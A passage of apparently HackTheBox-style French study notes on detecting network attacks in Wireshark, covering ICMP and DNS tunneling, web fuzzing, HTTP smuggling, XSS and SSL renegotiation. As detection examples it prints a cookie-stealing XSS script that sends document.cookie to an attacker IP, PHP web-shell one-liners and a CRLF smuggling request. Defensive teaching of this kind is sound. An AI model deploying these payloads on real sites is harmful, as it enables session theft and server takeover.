Dans Wireshark, vous pouvez inspecter le contenu des donnÃ©es dans les requÃªtes ICMP pour dÃ©tecter des informations sensibles (comme des **identifiants**, des **mots de passe**, etc.). Cela peut Ãªtre un signe direct de tunneling ICMP. Si les donnÃ©es semblent codÃ©es ou cryptÃ©es, elles nÃ©cessitent une attention particuliÃ¨re.

#### 4. **DÃ©codage des DonnÃ©es EncodÃ©es**

Les attaquants peuvent encoder ou crypter les donnÃ©es exfiltrÃ©es dans les paquets ICMP pour Ã©viter la dÃ©tection. Dans ce cas, le dÃ©codage manuel des donnÃ©es encodÃ©es pourrait Ãªtre nÃ©cessaire. Par exemple, si vous dÃ©tectez une chaÃ®ne encodÃ©e en base64, vous pouvez utiliser la commande suivante pour la dÃ©coder :

```bash
echo 'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=' | base64 -d
```

Cela renverra le texte dÃ©codÃ©, qui pourrait contenir des informations sensibles exfiltrÃ©es.

#### 5. **Anomalies de Taille de DonnÃ©es ICMP**

Si les tailles de donnÃ©es ICMP dÃ©passent les tailles typiques (environ 48 octets), cela nÃ©cessite une analyse plus approfondie. Un transfert de donnÃ©es excessif dans un paquet ICMP est souvent un indicateur clÃ© de tunneling.

### PrÃ©vention du Tunneling ICMP

Voici quelques mÃ©thodes pour prÃ©venir et limiter l'impact des attaques par **tunneling ICMP** :

1. **Bloquer les RequÃªtes ICMP**

   DÃ©sactiver les requÃªtes ICMP dans le rÃ©seau peut empÃªcher le tunneling ICMP, bien que cela puisse affecter les diagnostics de rÃ©seau lÃ©gitimes. Cette approche empÃªche les attaquants d'utiliser ICMP comme vecteur pour le tunneling.

2. **Inspecter les RequÃªtes et RÃ©ponses ICMP**

   En surveillant et en analysant le trafic ICMP, surtout les champs de donnÃ©es, il est possible de dÃ©tecter et d'attÃ©nuer les activitÃ©s suspectes de tunneling. Les administrateurs rÃ©seau doivent Ãªtre attentifs aux anomalies dans les tailles de donnÃ©es ICMP et aux tentatives de communication cachÃ©es.

### Conclusion

Le **tunneling ICMP** reprÃ©sente une mÃ©thode sophistiquÃ©e d'exfiltration de donnÃ©es. Cependant, avec une surveillance appropriÃ©e et l'utilisation d'outils comme **Wireshark**, il est possible de dÃ©tecter des anomalies dans le trafic ICMP et de prendre des mesures pour protÃ©ger le rÃ©seau. Les efforts de prÃ©vention, comme la dÃ©sactivation du ICMP ou l'inspection continue du trafic rÃ©seau, sont essentiels pour prÃ©venir ce type de menace.

```

## **HTTP & HTTPs Service Enumeration**

```jsx

---

## ğŸš¨ DÃ©tection et PrÃ©vention des Tentatives de Fuzzing sur les Serveurs Web

Les **modÃ¨les de trafic HTTP/HTTPS** inhabituels peuvent indiquer des attaques potentielles contre les serveurs web. Les attaquants exploitent souvent les vulnÃ©rabilitÃ©s de la couche de transport pour collecter des informations, explorer ou exploiter les applications web. L'une de ces mÃ©thodes d'attaque est le **fuzzing**, qui consiste Ã  envoyer des donnÃ©es alÃ©atoires ou inattendues Ã  un serveur pour dÃ©couvrir des vulnÃ©rabilitÃ©s.

### ğŸ§© Indicateurs des Tentatives de Fuzzing

Les signes courants des tentatives de fuzzing incluent :

* Un **trafic HTTP/HTTPS excessif** provenant d'un seul hÃ´te, souvent avec des modÃ¨les de requÃªtes irrÃ©guliers.
* Des **tentatives d'accÃ¨s rÃ©pÃ©titives ou inhabituelles** trouvÃ©es dans les journaux d'accÃ¨s du serveur web, comme des requÃªtes pour des fichiers ou des rÃ©pertoires inexistants.

### ğŸš€ DÃ©tection du Fuzzing de RÃ©pertoires

Le **fuzzing de rÃ©pertoires** consiste Ã  tester l'existence de pages web ou de rÃ©pertoires vulnÃ©rables. Cela se fait gÃ©nÃ©ralement en envoyant de nombreuses requÃªtes HTTP pour diffÃ©rents chemins.

#### Filtre Wireshark pour le Fuzzing de RÃ©pertoires :

1. **Filtre de base** :

   * Filtrer le trafic HTTP : `http`
2. **Isoler les requÃªtes** :

   * Pour se concentrer uniquement sur les requÃªtes (excluant les rÃ©ponses) : `http.request`

#### **Indicateurs du Fuzzing de RÃ©pertoires :**

* **RÃ©ponses 404 frÃ©quentes**, ce qui indique des tentatives rÃ©pÃ©tÃ©es d'accÃ¨s Ã  des fichiers ou rÃ©pertoires inexistants.
* **SÃ©quences de requÃªtes rapides**, oÃ¹ plusieurs requÃªtes sont envoyÃ©es dans une courte pÃ©riode.

#### Exemple :

Les journaux d'accÃ¨s peuvent afficher des entrÃ©es comme celles-ci :

```
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /randomfile1 HTTP/1.1" 404 435 "-" "Mozilla/4.0"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /.bash_history HTTP/1.1" 404 435 "-" "Mozilla/4.0"
```

---

### ğŸ› ï¸ Analyser les Journaux du Serveur Web pour le Fuzzing

Pour dÃ©tecter les tentatives de fuzzing sur votre serveur web, inspectez les journaux d'accÃ¨s pour repÃ©rer une activitÃ© inhabituelle.

#### **Commandes pour Filtrer les Journaux par Adresse IP :**

* **Avec `grep`** :

  ```
  cat access.log | grep "192.168.10.5"
  ```

* **Avec `awk`** :

  ```
  cat access.log | awk '$1 == "192.168.10.5"'
  ```

Recherchez des accÃ¨s rapides et rÃ©pÃ©titifs Ã  des ressources non existantes (comme `.bash_history`, `.git`, ou des demandes de chemins inhabituels).

---

### ğŸ›¡ï¸ DÃ©tecter d'Autres Techniques de Fuzzing

Les attaquants peuvent Ã©galement cibler des Ã©lÃ©ments **dynamiques ou statiques** de la page web, comme des **champs ID**, ou tester des vulnÃ©rabilitÃ©s de type **IDOR (Insecure Direct Object Reference)**. Ils peuvent utiliser des outils pour envoyer ces charges utiles, en particulier lors de l'analyse de **JSON**.

#### **Filtre Wireshark pour l'Analyse d'un HÃ´te SpÃ©cifique** :

Pour examiner le trafic provenant d'un hÃ´te spÃ©cifique, appliquez le filtre suivant :

```
http.request and ((ip.src_host == <IP suspectÃ©e>) or (ip.dst_host == <IP suspectÃ©e>))
```

#### **Suivre les Flux HTTP** :

* Faites un clic droit sur n'importe quelle requÃªte HTTP dans Wireshark et sÃ©lectionnez `Follow > HTTP Stream` pour voir la sÃ©quence complÃ¨te des requÃªtes et rÃ©ponses de cette session.

#### **Indicateurs du Fuzzing AvancÃ© :**

* **ModÃ¨les de requÃªtes rapides**, surtout pour des ressources qui n'existent pas.
* **Attaques Ã©chelonnÃ©es ou distribuÃ©es**, oÃ¹ les requÃªtes sont Ã©tendues dans le temps ou rÃ©parties sur plusieurs adresses IP pour Ã©viter la dÃ©tection.

---

### ğŸ›¡ï¸ PrÃ©venir les Tentatives de Fuzzing

Pour se protÃ©ger contre les tentatives de fuzzing et rÃ©duire le risque d'exploitation rÃ©ussie :

1. **Ajuster les Configurations du Serveur** :

   * Configurez votre serveur (par exemple, Apache ou Nginx) pour retourner les codes de rÃ©ponse appropriÃ©s pour les ressources inexistantes.
   * Utilisez des pages d'erreur personnalisÃ©es qui ne rÃ©vÃ¨lent pas d'informations sensibles sur la structure ou les fonctionnalitÃ©s du serveur.

2. **Mettre en place des RÃ¨gles de Web Application Firewall (WAF)** :

   * Les WAF peuvent bloquer des **IP spÃ©cifiques** ou des **modÃ¨les de comportement suspect**, comme des taux de requÃªtes inhabituels ou des tentatives rÃ©pÃ©tÃ©es d'accÃ¨s Ã  des ressources inexistantes.

3. **Limiter le Taux de RequÃªtes** :

   * ImplÃ©mentez des techniques de limitation du taux pour rÃ©duire l'efficacitÃ© des outils automatisÃ©s de fuzzing.

4. **ContrÃ´le d'AccÃ¨s** :

   * Assurez-vous que les rÃ©pertoires ou fichiers sensibles sont correctement sÃ©curisÃ©s ou cachÃ©s de l'accÃ¨s public (par exemple, `.git`, `.bash_history`).

En surveillant activement ces modÃ¨les et en mettant en place des protections robustes, les serveurs web peuvent Ãªtre mieux protÃ©gÃ©s contre les attaques par fuzzing.

---

```

## **Strange HTTP Headers**

```jsx
### Analyse du Trafic du Serveur Web et DÃ©tection des ActivitÃ©s Suspectes

Lorsque vous analysez le trafic d'un serveur web, l'absence de signes Ã©vidents comme le fuzzing ne garantit pas la sÃ©curitÃ©. Une inspection plus approfondie, en particulier des en-tÃªtes HTTP inhabituels, peut rÃ©vÃ©ler une activitÃ© suspecte. Voici quelques anomalies courantes Ã  surveiller :

#### En-tÃªtes Host Anormaux

Les en-tÃªtes **Host** manipulÃ©s ou inattendus sont souvent un signe d'attaque. Par exemple, un attaquant pourrait tenter de forcer un serveur Ã  exÃ©cuter une requÃªte vers une adresse ou un sous-domaine non autorisÃ©, ou Ã  contourner des restrictions de domaine.

##### Filtrage du Trafic HTTP

Commencez par limiter le trafic dans Wireshark pour observer uniquement les requÃªtes et rÃ©ponses HTTP :

```bash
http
```

##### Isolation des En-tÃªtes Host IrrÃ©guliers

SpÃ©cifiez l'adresse IP du serveur lÃ©gitime pour exclure le trafic normal. Pour un serveur externe, remplacez par le nom de domaine :

```bash
http.request and (!(http.host == "192.168.10.7"))
```

##### Indicateurs de Manipulation des En-tÃªtes Host

Examinez les rÃ©sultats pour dÃ©tecter des en-tÃªtes **Host** suspects tels que `127.0.0.1` ou des noms d'hÃ´te inhabituels comme `admin`. Les attaquants manipulent souvent ces en-tÃªtes pour escalader les privilÃ¨ges en utilisant des outils de proxy comme **Burp Suite**.

##### Mesures PrÃ©ventives :

* VÃ©rifiez les configurations **virtualhost** et d'accÃ¨s pour empÃªcher un accÃ¨s non autorisÃ©.
* Gardez votre serveur web **mis Ã  jour**.

---

#### Analyse des Erreurs 400 et DÃ©tection du Smuggling de RequÃªtes

Le code d'erreur **400 (Bad Request)** peut indiquer une activitÃ© suspecte et est utile pour identifier des actions HTTP malveillantes, notamment les attaques de **smuggling de requÃªtes** (injection CRLF).

##### Filtrage des RÃ©ponses de Code 400

Pour dÃ©tecter les tentatives de **request smuggling**, filtrez les rÃ©ponses avec le code 400 dans Wireshark :

```bash
http.response.code == 400
```

Suivez ces flux HTTP pour dÃ©couvrir des tentatives de **CRLF Injection**, une forme de smuggling oÃ¹ un attaquant tente de contourner les contrÃ´les de sÃ©curitÃ© via des en-tÃªtes HTTP malformÃ©s.

##### Exemple de Tentative de CRLF

Un attaquant pourrait construire une requÃªte comme suit :

```text
GET /login.php?id=1 HTTP/1.1
Host: 192.168.10.5
\r\n
GET /uploads/cmd2.php HTTP/1.1
Host: 127.0.0.1:8080
\r\n
HTTP/1.1
Host: 192.168.10.5
```

DÃ©codÃ© par le serveur, cela donne deux requÃªtes distinctes :

```text
GET /login.php?id=1 HTTP/1.1
Host: 192.168.10.5

GET /uploads/cmd2.php HTTP/1.1
Host: 127.0.0.1:8080

HTTP/1.1
Host: 192.168.10.5
```

Si le serveur est vulnÃ©rable, les deux requÃªtes peuvent rÃ©ussir, permettant un accÃ¨s non autorisÃ©.

##### Exemple de Configuration Apache VulnÃ©rable

Certaines configurations Apache mal sÃ©curisÃ©es peuvent laisser le serveur vulnÃ©rable Ã  ce type d'attaque :

```apache
<VirtualHost *:80>
    RewriteEngine on
    RewriteRule "^/categories/(.*)" "http://192.168.10.100:8080/categories.php?id=$1" [P]
    ProxyPassReverse "/categories/" "http://192.168.10.100:8080/"
</VirtualHost>
```

Cette **mauvaise configuration** permet Ã  l'attaquant de rediriger les requÃªtes vers un autre serveur sans restrictions, facilitant l'attaque de smuggling de requÃªtes.

---

#### Surveillance des Exploits RÃ©ussis

Pour dÃ©tecter un exploit rÃ©ussi, surveillez la prÃ©sence d'un code **200 (Success)** en rÃ©ponse Ã  une requÃªte suspecte. Une analyse rÃ©guliÃ¨re des rÃ©ponses avec les codes **400** et **200** est essentielle pour identifier et attÃ©nuer les actions adverses dans le trafic HTTP.

En rÃ©sumÃ©, la dÃ©tection des attaques de **manipulation des en-tÃªtes Host** et de **request smuggling** repose sur une vigilance constante sur les erreurs HTTP, les anomalies dans les en-tÃªtes et le suivi des codes de statut HTTP dans le trafic.

```

## **Cross-Site Scripting (XSS) & Code Injection Detection**

```jsx

---

## ğŸ” DÃ©tection d'un comportement anormal dans le trafic HTTP

Un **volume inhabituel de requÃªtes HTTP vers un "serveur" interne inconnu** peut signaler une activitÃ© suspecte, notamment une **attaque de type Cross-Site Scripting (XSS)**. Ces requÃªtes peuvent servir Ã  **exfiltrer des cookies ou des jetons de session**, mÃªme si les valeurs sont souvent encodÃ©es ou chiffrÃ©es en transit.

---

## ğŸ **Cross-Site Scripting (XSS)**

Lâ€™XSS survient lorsquâ€™un attaquant **injecte du code JavaScript malveillant** dans une page web via des champs d'entrÃ©e utilisateur. Ce code est ensuite **exÃ©cutÃ© dans le navigateur des autres utilisateurs**, permettant Ã  lâ€™attaquant de voler des donnÃ©es sensibles comme les cookies ou tokens de session.

### ğŸ“¦ Exemple de payload XSS :

```html
<script>
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
</script>
```

â¡ï¸ **Ce que fait ce script :** il capture les cookies de lâ€™utilisateur et les envoie silencieusement Ã  une IP interne contrÃ´lÃ©e par lâ€™attaquant.

### âš ï¸ Si ce type de code est dÃ©tectÃ© :

* Supprimez immÃ©diatement le script injectÃ©.
* ConsidÃ©rez la mise hors ligne temporaire du serveur concernÃ© pour appliquer des correctifs de sÃ©curitÃ©.

---

## ğŸ’¥ **Injection de code (PHP, etc.)**

Des attaquants peuvent aussi exploiter des champs de saisie pour y insÃ©rer du **code exÃ©cutable** (comme PHP), afin dâ€™obtenir un **accÃ¨s Ã  distance** ou de **prendre le contrÃ´le du serveur**.

### ğŸ’» Exemples typiques de code PHP malveillant :

```php
<?php system($_GET['cmd']); ?>
```

â¡ï¸ Permet Ã  lâ€™attaquant dâ€™exÃ©cuter des commandes systÃ¨me Ã  distance via lâ€™URL.

```php
<?php echo `whoami`; ?>
```

â¡ï¸ Affiche lâ€™utilisateur courant exÃ©cutant le serveur web.

### âš ï¸ Si ce code est dÃ©couvert :

* Supprimez-le immÃ©diatement.
* Identifiez l'origine de l'injection et sÃ©curisez la faille utilisÃ©e.

---

## ğŸ›¡ï¸ **Mesures de prÃ©vention contre les attaques XSS et les injections de code**

### âœ… 1. **Sanitiser les entrÃ©es utilisateur** :

* Ã‰vitez tout contenu HTML/JS non filtrÃ©.
* Utilisez des fonctions comme `htmlspecialchars()` (PHP), `DOMPurify` (JS) ou des ORM sÃ©curisÃ©s cÃ´tÃ© serveur.

### âœ… 2. **Ne jamais exÃ©cuter d'entrÃ©e utilisateur comme du code** :

* Aucune donnÃ©e envoyÃ©e par l'utilisateur ne doit Ãªtre Ã©valuÃ©e dynamiquement (`eval()`, `system()`, etc.).
* PrÃ©fÃ©rez les appels paramÃ©trÃ©s et les API sÃ©curisÃ©es.

---

```

## **SSL Renegotiation Attacks**

```jsx
### Analyse du Trafic HTTPS et DÃ©tection des Attaques BasÃ©es sur SSL/TLS

Lors de l'analyse du trafic HTTPS, il est essentiel de comprendre les indicateurs du protocole HTTPS qui peuvent rÃ©vÃ©ler des attaques basÃ©es sur SSL/TLS. HTTPS repose sur des protocoles de chiffrement, spÃ©cifiquement :

* **Transport Layer Security (TLS)**
* **Secure Sockets Layer (SSL)**

### Processus de Connexion HTTPS

1. **Handshake (PoignÃ©e de main)** : Le serveur et le client Ã©tablissent une connexion, s'accordant sur les algorithmes de chiffrement et Ã©changent des certificats.
2. **Chiffrement** : AprÃ¨s la poignÃ©e de main, la connexion est chiffrÃ©e avec l'algorithme sÃ©lectionnÃ©.
3. **Ã‰change de DonnÃ©es** : Les donnÃ©es chiffrÃ©es (pages web, images, etc.) sont Ã©changÃ©es entre le client et le serveur.
4. **DÃ©chiffrement** : Les deux cÃ´tÃ©s dÃ©chiffrent les donnÃ©es Ã  l'aide de leurs clÃ©s privÃ©es et publiques.

### Attaque de RenÃ©gociation SSL

Les **attaques de renÃ©gociation SSL** tentent de nÃ©gocier des normes de chiffrement plus faibles ou d'exploiter les ressources du serveur, entraÃ®nant des vulnÃ©rabilitÃ©s potentielles. Un autre exemple d'attaque liÃ©e au chiffrement HTTPS est la **vulnÃ©rabilitÃ© Heartbleed** (CVE-2014-0160).

### Processus de Handshake TLS et SSL

Pour sÃ©curiser une connexion, un **handshake** TLS ou SSL est nÃ©cessaire, impliquant :

1. **Client Hello** : Le client envoie les versions TLS/SSL prises en charge, les suites de chiffrement et des donnÃ©es alÃ©atoires.
2. **Server Hello** : Le serveur rÃ©pond avec la version choisie, la suite de chiffrement et un nonce.
3. **Ã‰change de Certificats** : Le serveur envoie son certificat contenant la clÃ© publique.
4. **Ã‰change de ClÃ©s** : Le client gÃ©nÃ¨re un **premaster secret**, le chiffre avec la clÃ© publique du serveur, et l'envoie au serveur.
5. **DÃ©rivation de la ClÃ© de Session** : Les deux parties dÃ©rivent des clÃ©s de session Ã  l'aide des nonces Ã©changÃ©s et du **premaster secret**.
6. **Messages de Fin** : Les deux parties Ã©changent des messages de fin, confirmant la rÃ©ussite du handshake.
7. **Ã‰change SÃ©curisÃ© de DonnÃ©es** : La communication chiffrÃ©e commence.

### DÃ©tail Algorithmique du Handshake TLS

| Ã‰tape du Handshake                  | Calculs pertinents                                                                                                       |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| **Client Hello**                    | ClientHello = { ClientVersion, ClientRandom, Ciphersuites, CompressionMethods }                                          |
| **Server Hello**                    | ServerHello = { ServerVersion, ServerRandom, Ciphersuite, CompressionMethod }                                            |
| **Ã‰change de Certificat**           | ServerCertificate = { ServerPublicCertificate }                                                                          |
| **Ã‰change de ClÃ©s**                 | ClientDHPublicKey = DH\_KeyGeneration(ClientDHPrivateKey) <br> ServerDHPublicKey = DH\_KeyGeneration(ServerDHPrivateKey) |
| **Premaster Secret**                | PremasterSecret = DH\_KeyAgreement(ServerDHPublicKey, ClientDHPrivateKey)                                                |
| **DÃ©rivation de la ClÃ© de Session** | MasterSecret = PRF(PremasterSecret, "master secret", ClientNonce + ServerNonce)                                          |
| **Extraction des ClÃ©s de Session**  | ClientWriteMACKey, ServerWriteMACKey, ClientWriteKey, ServerWriteKey, ClientWriteIV, ServerWriteIV                       |
| **Messages de Fin**                 | FinishedMessage = PRF(MasterSecret, "finished", Hash(ClientHello + ServerHello))                                         |

### DÃ©tection des Attaques de RenÃ©gociation SSL

* **Filtrer les Messages de Handshake** : Dans Wireshark, utilisez le filtre suivant pour voir uniquement les messages de handshake :

```bash
ssl.record.content_type == 22
```

#### Indicateurs des Attaques de RenÃ©gociation SSL :

* **Multiples Client Hellos** : Des messages Client Hello rÃ©pÃ©tÃ©s d'un mÃªme client dans un court laps de temps signalent une attaque, car l'attaquant dÃ©clenche Ã  plusieurs reprises la renÃ©gociation pour abaisser la suite de chiffrement.
* **Messages de Handshake DÃ©sordonnÃ©s** : Observer des messages Client Hello aprÃ¨s la fin du handshake peut indiquer une manipulation ou une attaque.

### Raisons des Attaques de RenÃ©gociation SSL

* **DÃ©ni de Service** : Une renÃ©gociation excessive consomme des ressources serveur, rendant le serveur non rÃ©actif.
* **Exploitation de la Suite de Chiffrement** : Les attaquants peuvent tenter une renÃ©gociation pour exploiter des configurations de chiffrement faibles.
* **Cryptanalyse** : La renÃ©gociation peut faciliter la cryptanalyse en aidant les attaquants Ã  analyser les modÃ¨les SSL/TLS, ce qui pourrait exposer des vulnÃ©rabilitÃ©s.

```

## **Peculiar DNS Traffic**

```jsx
### Analyse du Trafic DNS

Lâ€™analyse du trafic DNS peut Ãªtre complexe en raison de son volume Ã©levÃ©, mais il est essentiel d'identifier les anomalies pour dÃ©tecter les activitÃ©s malveillantes. Voici un aperÃ§u du fonctionnement des requÃªtes DNS et des mÃ©thodes de dÃ©tection d'activitÃ©s suspectes.

#### RequÃªtes DNS

Les requÃªtes DNS permettent aux clients de rÃ©soudre des noms de domaine en adresses IP et vice versa.

##### RequÃªtes DNS Forward (Recherche Directe)

Dans une recherche directe (forward lookup), le client rÃ©sout un nom de domaine en une adresse IP, suivant ces Ã©tapes :

1. **Initiation de la RequÃªte** : Le client interroge un domaine, par exemple `academy.hackthebox.com`.
2. **VÃ©rification du Cache Local** : VÃ©rifie le cache DNS local ; si non rÃ©solu, continue.
3. **RequÃªte RÃ©cursive** : Envoie la requÃªte au serveur DNS configurÃ©.
4. **Serveurs Racine** : Si nÃ©cessaire, le rÃ©solveur DNS interroge les serveurs racine.
5. **Serveurs TLD** : Le serveur racine dirige vers les serveurs TLD (par exemple, `.com`).
6. **Serveurs Autoritatifs** : Le serveur TLD oriente vers le serveur autoritatif du domaine.
7. **Serveurs Autoritatifs du Domaine** : Le rÃ©solveur obtient lâ€™adresse IP.
8. **RÃ©ponse** : L'adresse IP est renvoyÃ©e au client.

##### RequÃªtes DNS Reverse (Recherche Inverse)

Les recherches inverses sont utilisÃ©es pour trouver un nom de domaine Ã  partir d'une adresse IP :

1. **Initiation de la RequÃªte** : Le client envoie une requÃªte DNS inverse avec lâ€™adresse IP.
2. **Zones de Recherche Inverse** : Le rÃ©solveur DNS vÃ©rifie s'il est autorisÃ©.
3. **RequÃªte pour le PTR** : Le rÃ©solveur recherche un enregistrement PTR.
4. **RÃ©ponse** : Le FQDN (Fully Qualified Domain Name) est retournÃ© si un PTR correspondant est trouvÃ©.

#### Types d'Enregistrements DNS

| Type d'Enregistrement | Description                                          |
| --------------------- | ---------------------------------------------------- |
| **A**                 | Associe un nom de domaine Ã  une adresse IPv4         |
| **AAAA**              | Associe un nom de domaine Ã  une adresse IPv6         |
| **CNAME**             | CrÃ©e un alias pour un domaine                        |
| **MX**                | SpÃ©cifie le serveur de messagerie pour le domaine    |
| **NS**                | Serveurs de noms autoritatifs pour le domaine        |
| **PTR**               | UtilisÃ© pour les recherches inverses (IP -> Domaine) |
| **TXT**               | SpÃ©cifie du texte associÃ© au domaine                 |
| **SOA**               | Informations administratives sur la zone             |

#### DÃ©tection des Tentatives d'Ã©numÃ©ration DNS

Un volume Ã©levÃ© de requÃªtes DNS provenant d'un seul hÃ´te peut indiquer une **Ã©numÃ©ration DNS**. Pour dÃ©tecter cela, vous pouvez filtrer le trafic DNS dans **Wireshark** en utilisant le filtre suivant :

```bash
dns
```

Si des requÃªtes incluent **ANY**, cela peut indiquer une Ã©numÃ©ration DNS, voire une Ã©numÃ©ration de sous-domaines.

#### DÃ©tection du Tunneling DNS

Le tunneling DNS peut impliquer un nombre important d'enregistrements **TXT** provenant d'un seul hÃ´te. Les attaquants peuvent exfiltrer des donnÃ©es en les appendant dans le champ TXT des requÃªtes DNS.

##### Indicateurs de Tunneling DNS

Examinez le trafic DNS pour dÃ©tecter des donnÃ©es inhabituelles ou inattendues dans le champ **TXT**. Les donnÃ©es peuvent Ãªtre encodÃ©es ou chiffrÃ©es, souvent en **base64** :

* Exemple de donnÃ©es encodÃ©es en base64 :

```bash
echo 'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=' | base64 -d
```

##### Gestion de l'Encodage Multiple

Certains attaquants peuvent encoder les donnÃ©es plusieurs fois ou les chiffrer, rendant leur dÃ©tection plus difficile :

```bash
echo 'encoded_string' | base64 -d | base64 -d | base64 -d
```

##### Raisons du Tunneling DNS

* **Exfiltration de donnÃ©es** : UtilisÃ© pour exporter de maniÃ¨re furtive des donnÃ©es dâ€™un rÃ©seau.
* **Commandes et ContrÃ´le** : Permet aux systÃ¨mes compromis de communiquer avec les serveurs contrÃ´lÃ©s par l'attaquant, souvent utilisÃ©s dans les botnets.
* **Bypass de Pare-feu** : Les tunnels DNS peuvent contourner les pare-feu ou les proxys se concentrant sur les protocoles HTTP/HTTPS.
* **Domain Generation Algorithms (DGA)** : Les malwares avancÃ©s utilisent des algorithmes de gÃ©nÃ©ration de domaines (DGA) pour gÃ©nÃ©rer des noms de domaine dynamiques, compliquant ainsi la dÃ©tection.

#### L'IPFS et le Tunneling DNS

Des acteurs de menaces avancÃ©es peuvent utiliser **IPFS** (Interplanetary File System) pour stocker et rÃ©cupÃ©rer des fichiers malveillants. Cela rend le trafic DNS/HTTP vers des URI comme celles-ci particuliÃ¨rement significatif :

* **Exemple d'URI IPFS** :

```text
https://cloudflare-ipfs.com/ipfs/QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz
```

IPFS fonctionne de maniÃ¨re dÃ©centralisÃ©e, ce qui complique sa dÃ©tection. La surveillance rÃ©guliÃ¨re du trafic DNS et HTTP/HTTPS est essentielle pour attÃ©nuer ces attaques.

```

## **Strange Telnet & UDP Connections**

```jsx
### Analyse du Trafic Telnet et UDP : DÃ©tection des ActivitÃ©s Suspectes

Lors de l'analyse du trafic rÃ©seau, il est essentiel de prÃªter attention au **trafic Telnet** et au **trafic UDP**, qui peuvent parfois rÃ©vÃ©ler des activitÃ©s suspectes ou anormales qui pourraient autrement passer inaperÃ§ues.

#### Telnet

Le protocole **Telnet**, bien qu'Ã©tant obsolÃ¨te en raison de ses prÃ©occupations en matiÃ¨re de sÃ©curitÃ©, est encore utilisÃ© dans certains systÃ¨mes hÃ©ritÃ©s (par exemple, les anciens systÃ¨mes Windows NT). MÃªme si Telnet est largement remplacÃ© par SSH pour la communication Ã  distance sÃ©curisÃ©e, il peut encore Ãªtre utile de surveiller le trafic Telnet pour dÃ©tecter d'Ã©ventuelles connexions suspectes ou abusives.

##### DÃ©tection du Trafic Telnet Traditionnel sur le Port 23

Le port **23** est le port par dÃ©faut pour **Telnet**. Lorsque vous observez du trafic sur ce port dans **Wireshark**, portez une attention particuliÃ¨re aux communications pour repÃ©rer tout signe d'abus. Bien que Telnet soit un protocole non cryptÃ© et facile Ã  inspecter, les attaquants peuvent parfois chiffrer ou obfusquer les donnÃ©es dans le trafic Telnet. Il est donc nÃ©cessaire d'Ãªtre vigilant et d'inspecter minutieusement les flux de donnÃ©es.

##### Trafic Telnet Non Reconnu sur des Ports Non Standards

Telnet peut fonctionner sur n'importe quel port, et les attaquants peuvent dÃ©placer les communications Telnet vers des ports non standards pour masquer leurs activitÃ©s malveillantes. Par exemple, des communications sur le **port 9999** peuvent indiquer une tentative de dissimulation. Dans ce cas, il est conseillÃ© de suivre le flux TCP dans Wireshark pour examiner davantage.

##### Trafic Telnet via IPv6

Si du trafic Telnet via **IPv6** est dÃ©tectÃ© dans un rÃ©seau configurÃ© en IPv4, cela pourrait indiquer un accÃ¨s non autorisÃ©. Pour filtrer spÃ©cifiquement le trafic Telnet sur IPv6 dans Wireshark, utilisez le filtre suivant :

```bash
((ipv6.src_host == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dst_host == fe80::c9c8:ed3:1b10:f10b)) and telnet
```

Ce filtre vous aide Ã  isoler le trafic Telnet sur des adresses IPv6 spÃ©cifiques pour une inspection plus approfondie.

---

#### Surveillance des Communications UDP

Le **trafic UDP** est souvent utilisÃ© par les attaquants pour contourner la surveillance basÃ©e sur TCP, en raison de la nature **sans connexion** et de la transmission rapide d'UDP. Cette caractÃ©ristique peut Ãªtre avantageuse pour l'exfiltration de donnÃ©es furtives.

##### TCP vs UDP

Contrairement Ã  **TCP**, qui nÃ©cessite un processus de **handshake** (SYN, SYN/ACK, ACK) avant la transmission des donnÃ©es, **UDP** est un protocole **sans connexion**, ce qui permet une communication plus rapide, mais rÃ©duit la fiabilitÃ© et la traÃ§abilitÃ© des connexions.

##### Utilisations Courantes de UDP

Lors de l'investigation du trafic UDP, il est important de prendre en compte les cas d'utilisation lÃ©gitimes suivants :

* **Applications en temps rÃ©el** : Des applications telles que la **vidÃ©o en streaming**, les **jeux en ligne**, et la **voix sur IP** utilisent UDP pour des connexions plus rapides.
* **DNS (Domain Name System)** : Les requÃªtes et rÃ©ponses DNS sont principalement basÃ©es sur UDP.
* **DHCP (Dynamic Host Configuration Protocol)** : UDP est utilisÃ© pour attribuer des adresses IP et configurer les rÃ©seaux.
* **SNMP (Simple Network Management Protocol)** : UDP est utilisÃ© pour la surveillance et la gestion du rÃ©seau.
* **TFTP (Trivial File Transfer Protocol)** : TFTP, un protocole pour les transferts de fichiers simples, utilise Ã©galement UDP, notamment dans les systÃ¨mes plus anciens.

##### Anomalies dans le Trafic UDP

Pour un trafic UDP inhabituel, suivez le flux dans **Wireshark** pour inspecter son contenu et vÃ©rifier sa lÃ©gitimitÃ©. Toute communication non attendue ou incohÃ©rente pourrait indiquer une activitÃ© malveillante, comme de l'exfiltration de donnÃ©es ou des attaques par amplification.

---

### RÃ©sumÃ©

* **Telnet** : Bien que de plus en plus obsolÃ¨te, le trafic Telnet sur des ports non standards ou via IPv6 doit Ãªtre surveillÃ© de prÃ¨s, surtout s'il provient de sources ou destinations suspectes. La dÃ©tection de Telnet sur des ports inattendus, comme le port 9999, peut indiquer une tentative d'obscurcissement des activitÃ©s malveillantes.
* **UDP** : Le trafic UDP, en raison de son caractÃ¨re sans connexion, peut Ãªtre utilisÃ© Ã  des fins d'exfiltration furtive de donnÃ©es ou d'attaque. Surveillez attentivement les flux UDP inhabituels, en particulier pour des services comme DNS, DHCP, et SNMP qui utilisent souvent ce protocole.

En Ã©tant vigilant et en filtrant correctement les flux, vous pouvez dÃ©tecter les anomalies de maniÃ¨re efficace et rÃ©duire les risques associÃ©s Ã  ces types de trafic.

```

## Working with IDS/IPS

## **Suricata Fundamentals**

```jsx
